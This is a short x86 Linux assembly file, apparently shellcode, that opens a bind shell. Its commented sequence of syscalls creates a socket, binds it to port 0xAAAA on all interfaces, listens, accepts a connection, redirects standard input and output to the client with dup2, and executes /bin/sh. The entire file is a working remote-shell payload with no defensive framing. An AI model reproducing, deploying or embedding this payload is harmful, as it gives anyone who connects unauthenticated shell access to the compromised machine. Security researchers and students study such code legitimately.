BITS 32 
xor eax, eax 
xor ebx, ebx 
cdq 

; soc = sockcall(1, [2, 1, 0]) 
push edx 
push byte 0x01 
push byte 0x02 
mov ecx, esp 
inc bl 
mov al, 102 
int 0x80 
mov esi, eax ;store the return value(soc) 

; serv_addr.sin_family = 2 
; serv_addr.sin_addr.s_addr = 0 
; serv_addr.sin_port = 0xAAAA 
; bind(sock, (struct sockaddr *)&serv_addr, 0x10) 
; => sockcall(2, [sock, &serv_addr, 0x10]) 
push edx 
push edx 
push edx 
push 0xAAAA 
inc bl 
push bx 
mov ecx, esp 
push byte 0x10 
push ecx 
push esi 
mov ecx, esp 
mov al, 102 
int 0x80 

; listen(sock, 0) 
; => sockcall(4, [sock, 0]) 
push edx 
push esi 
mov ecx, esp 
mov bl, 0x04 
mov al, 102 
int 0x80 

; cli = accept(sock, 0, 0) 
; => cli = sockcall(5, [sock, 0, 0]) 
push edx 
push edx 
push esi 
mov ecx, esp 
inc bl 
mov al, 102 
int 0x80 
mov ebx, eax 

; dup2(cli, 0) 
; dup2(cli, 1) 
; dup2(cli, 2) 
xor ecx, ecx 
mov cl, 3 
loop: 
dec cl 
mov al, 63 
int 0x80 
jnz loop 

; execve("/bin/sh", 0, 0) 
push ecx 
push long 0x68732f6e 
push long 0x69622f2f 
mov ebx, esp 
mov edx, ecx 
mov al, 0x0b 
int 0x80
